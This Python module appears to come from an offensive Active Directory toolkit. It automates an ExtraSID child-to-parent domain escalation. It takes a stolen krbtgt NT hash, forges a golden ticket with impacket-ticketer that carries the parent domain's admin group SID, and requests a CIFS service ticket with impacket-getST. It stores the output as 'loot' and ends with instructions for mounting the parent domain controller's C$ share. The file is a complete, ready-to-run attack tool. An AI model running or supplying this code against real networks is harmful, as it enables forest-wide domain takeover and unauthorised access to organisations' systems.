# modules/extrasid.py

import os
import subprocess
import re
import shutil
from core.colors import red, green, yellow, blue
from core.helpers import save_loot
from rich import print

def is_valid_sid(sid):
    return bool(re.match(r"^S-\d-\d+(-\d+){1,}$", sid))

def run(session):
    print(blue("[*] Starting ExtraSID privilege escalation (child → parent)..."))

    child_domain = session.domain
    dc_ip = session.dc_ip
    username = session.username

    # === Prompt inputs
    print(blue(f"[*] Current session user: {username}@{child_domain}"))

    nthash = input("[?] Enter NT hash of krbtgt for child domain: ").strip()
    parent_domain = input("[?] Enter parent domain FQDN (e.g., finance.corp): ").strip()
    child_sid = input("[?] Enter Child Domain SID: ").strip()
    parent_sid = input("[?] Enter Parent Domain SID: ").strip()

    if not all([is_valid_sid(child_sid), is_valid_sid(parent_sid)]):
        print(red("[-] One or more SIDs are invalid. Aborting."))
        return

    if not re.fullmatch(r"[0-9a-fA-F]{32}", nthash):
        print(red("[-] NT hash must be exactly 32 hex characters."))
        return

    if "." not in parent_domain:
        print(red("[-] Invalid parent domain format (missing '.')."))
        return

    if not shutil.which("impacket-ticketer") or not shutil.which("impacket-getST"):
        print(red("[-] Required tools not found: impacket-ticketer / getST"))
        return

    tgt_file = f"loot/{username}_extratgt.ccache"
    tgt_basename = tgt_file.replace(".ccache", "")

    # === Step 1: Forge TGT
    tgt_cmd = [
        "impacket-ticketer",
        "-domain", child_domain,
        "-nthash", nthash,
        "-domain-sid", child_sid,
        "-user-id", "500",
        "-groups", "512",
        "-extra-sid", f"{parent_sid}-512",
        "-outputfile", tgt_basename,
        username
    ]

    print(blue("[*] Generating TGT via impacket-ticketer..."))
    try:
        subprocess.run(tgt_cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(red(f"[-] TGT creation failed: {e}"))
        return

    if not os.path.exists(tgt_file):
        print(red("[-] TGT file was not created. Something failed."))
        return

    print(green(f"[+] TGT saved: {tgt_file}"))
    os.environ["KRB5CCNAME"] = os.path.abspath(tgt_file)
    os.putenv("KRB5CCNAME", os.path.abspath(tgt_file))
    print(green("[+] TGT loaded into memory (env KRB5CCNAME set)"))

    # === Step 2: Get ST
    spn = f"CIFS/{parent_domain.split('.')[0]}-dc.{parent_domain}"
    getst_cmd = [
        "impacket-getST",
        "-spn", spn,
        "-k", "-no-pass",
        f"{child_domain}/{username}"
    ]

    print(blue(f"[*] Requesting ST for: {spn}"))
    try:
        subprocess.run(getst_cmd, check=True)
        print(green("[+] Service ticket obtained via impacket-getST"))
        save_loot("extratgt.log", f"TGT: {tgt_file}\nSPN: {spn}")
    except subprocess.CalledProcessError as e:
        print(red(f"[-] ST request failed: {e}"))
        return

    # === Final Tip
    print(blue("[*] You can now use KRB5CCNAME to access the parent domain"))
    print(yellow("  Example:"))
    print(yellow(f"    export KRB5CCNAME={tgt_file}"))
    print(yellow(f"    smbclient -k \\\\{parent_domain.split('.')[0]}-dc\\C$"))
